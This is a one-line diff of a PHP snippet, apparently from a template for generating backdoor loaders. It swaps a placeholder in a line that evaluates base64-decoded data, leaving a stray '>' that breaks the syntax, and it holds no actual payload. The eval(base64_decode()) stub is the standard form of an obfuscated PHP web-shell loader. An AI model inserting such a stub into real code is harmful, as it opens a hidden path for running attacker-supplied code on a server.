@@ -1,1 +1,1 @@
-<?php $s=<base64payload>;eval(base64_decode($s)); ?>
+<?php $s={payload}>;eval(base64_decode($s)); ?>
